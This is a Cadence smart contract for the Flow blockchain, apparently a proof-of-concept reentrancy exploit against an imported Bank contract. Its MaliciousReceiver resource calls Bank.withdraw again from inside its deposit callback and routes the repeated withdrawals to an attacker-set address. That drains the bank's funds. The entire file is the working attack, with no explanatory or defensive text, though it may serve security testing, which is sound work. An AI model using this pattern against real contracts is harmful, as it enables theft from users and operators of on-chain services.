import FungibleToken from "utility/FungibleToken.cdc"
import Bank from "Bank.cdc"

access(all) contract MaliciousContract {
	pub resource MaliciousReceiver: FungibleToken.Receiver {
		access(self) let receiver: Address

		pub fun deposit(from: @FungibleToken.Vault) {
			let receiverRef = getAccount(self.receiver)
				.getCapability(/public/flowTokenReceiver)
				.borrow<&{FungibleToken.Receiver}>()
				?? panic("Unable to borrow receiver reference")

			Bank.withdraw(address: self.receiver, amount: from.balance, receiver: receiverRef)
			receiverRef.deposit(from: <-from)
		}

		init(receiver: Address) {
			self.receiver = receiver
		}
	}

	pub fun createMaliciousReceiver(receiver: Address): @MaliciousReceiver {
		return <- create MaliciousReceiver(receiver: receiver)
	}
}
